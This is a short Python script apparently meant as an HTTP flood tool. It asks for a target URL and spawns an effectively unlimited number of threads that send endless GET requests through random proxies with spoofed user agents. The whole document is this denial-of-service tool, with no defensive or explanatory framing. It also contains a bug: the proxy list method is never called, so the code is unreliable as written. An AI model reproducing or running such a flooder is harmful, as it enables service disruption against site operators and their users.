import requests, threading, time,random 
from fake_useragent import UserAgent
from colorama import Fore

count = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
url = input("URL --> ")

def Gen():
	while True:
		ua = UserAgent()
		agent = ua.random
		proxys = open ('proxies.txt', 'r').read().splitlines
		proxy = random.choice(proxys)
		proxies = {'http': f'http://{proxy}', 'https':f'http://{proxy}'}
		headers = {
    "User-Agent":
    agent
}
		requests.get(url, headers=headers, proxies=proxies)
		print(f"Request Sent as {agent}")

if __name__ == '__main__':
    for i in range(count):
        threading.Thread(target=Gen).start()